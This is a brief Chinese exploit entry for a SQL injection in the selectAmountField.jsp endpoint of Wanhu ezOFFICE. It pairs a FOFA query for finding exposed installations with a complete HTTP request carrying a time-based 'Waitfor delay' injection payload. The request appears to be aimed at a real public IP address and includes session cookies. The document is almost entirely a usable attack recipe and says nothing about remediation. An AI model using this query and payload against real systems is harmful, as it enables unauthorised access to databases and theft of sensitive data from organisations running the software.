## 万户 ezOFFICE selectAmountField.jsp SQL注入

selectAmountField .jsp接口处存在sql注入漏洞，攻击者可获取数据库中敏感信息

## fofa
```
app="ezOFFICE协同管理平台"
```

## poc
```
GET /defaultroot/platform/custom/custom_database/dropdownselect/selectAmountField.jsp;.js?tableId=11%20Waitfor%20delay%20'0:0:5'%20%2d%2d%20 HTTP/1.1
Host: 60.216.117.230:7001
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: OASESSIONID=1889A485C582C2767D32B0371124D2E8; OASESSIONID=A52236350E4A11BBCAF4032BAFA3F6BA; LocLan=zh_CN
Connection: close
```

